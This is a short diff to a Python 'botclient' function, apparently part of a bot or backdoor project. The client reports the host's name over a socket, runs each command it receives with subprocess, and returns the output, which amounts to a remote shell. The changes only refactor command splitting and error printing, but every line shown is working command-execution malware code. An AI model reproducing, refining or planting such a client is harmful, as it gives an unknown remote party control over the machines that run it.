@@ -12,18 +12,18 @@ def botclient():
     message = 'Connection from '+socket.gethostname()
     s.send(message.encode())
     data = s.recv(1024).decode()
+    
     while data != 'end':
-        data = data.split(' ')
         if (data):
             try:
-                message = subprocess.run(data, stdout=subprocess.PIPE)
+                message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)
                 s.send(message.stdout)
             except Exception as e:
-                print(e)
                 print('Error processing'.format(data))
+                print(e)
+
         data = s.recv(1024).decode()
     s.close()
-
 
 if __name__ == '__main__':
     botclient()
